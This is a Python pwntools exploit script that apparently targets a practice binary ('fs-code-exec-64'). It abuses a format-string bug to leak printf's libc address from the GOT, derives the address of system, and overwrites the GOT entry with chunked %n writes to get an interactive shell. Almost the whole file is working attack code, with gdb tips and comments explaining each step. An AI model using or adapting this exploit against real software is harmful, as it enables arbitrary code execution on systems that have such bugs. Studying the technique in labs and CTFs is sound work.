#!/usr/bin/env python

from pwn import *

p = process('./fs-code-exec-64')

"""
context.terminal = ['tmux', 'splitw', '-h']
p = process('./gs-code-exec-64')
gdb.attach(p)
raw_input()
"""

"""
To  get beginning of printf stack:
break at target printf.
show x/x $esp
then take address and show as x/20w address
Then find input that you put in.
"""

gotPrintf = p.elf.got['printf']

print(hex(gotPrintf))

print(p.recv())

p.sendline("BBBB%7$s" + p64(gotPrintf+1)) #leak data of got as a string

data = p.recv()

print(repr(data))

libcPrintf = u64("\x00" + data[10:15] + "\x00\x00") #cut data of the libc addr of printf

print(hex(libcPrintf)) #check if data is correct by seeing if last 3 characters are the same as printf in gdb

#calculate offset here:
system = libcPrintf - 0x7ff814b43800 + 0x7ff814b33390 #fill in printfgrab and system grab with addr

print("printf: " + hex(libcPrintf))
print("system: " + hex(system))

lower16 = system & 0xffff
mid16 = system >> 16 & 0xffff
upper16 = system >> 32 & 0xffff

print("low: " + hex(lower16))
print("mid: " + hex(mid16))
print("upp: " + hex(upper16))
print('\n')
first = lower16

print("first: " + hex(first))

second = mid16 - lower16 #shift upper 16 bits to lower 16 bits then subtract lower16 to get correct input

while second < 0:   #avoid negative values
    second += 0x10000

print("second: " + hex(second))

third = upper16 - mid16

while third < 0:
    third += 0x10000

print("third: " + hex(third))

four = 0x10000 - upper16

buf = "%" + "%05d" % first + "x"
buf += "%12$n"
buf += "%" + "%05d" % second + "x"
buf += "%13$n"
buf += "%" + "%05d" % third + "x"
buf += "%14$n"
buf += "%" + "%05d" % four + "x"
buf += "%15$n"

print(len(buf))

buf += p64(gotPrintf) #write first two bytes
buf += p64(gotPrintf + 2) #write next two bytes
buf += p64(gotPrintf + 4) #write next two bytes
buf += p64(gotPrintf + 6)
#export PATH=$PATH: `pwd` in terminal to set path
#backticks will run program and insert output of function as string

p.sendline(buf)
p.interactive()
